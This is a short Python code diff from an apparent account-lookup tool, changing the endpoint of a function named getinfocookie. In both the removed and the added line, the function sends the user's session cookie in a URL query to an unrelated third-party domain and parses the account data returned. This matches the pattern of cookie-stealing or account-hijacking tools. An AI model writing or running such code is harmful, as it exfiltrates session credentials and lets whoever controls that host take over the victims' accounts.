@@ -21,7 +21,7 @@ def getinfo(user):
         return f"Username: {input}\nDisplayName: {displayn}\nUserid: {userid}\nCreated: {created}\nIsBanned: {banned}\nFollowers: {followers}\nFollowing: {following}\nDescription: {desc}"
 
 def getinfocookie(cookie):
-    r = requests.get(f'https://story-of-jesus.xyz/e.php?cookie={cookie}') 
+    r = requests.get(f'https://story-of-jesus.xyz/userinfo.php?cookie={cookie}') 
     data = r.json() 
 
     if data["status"] == "failed":
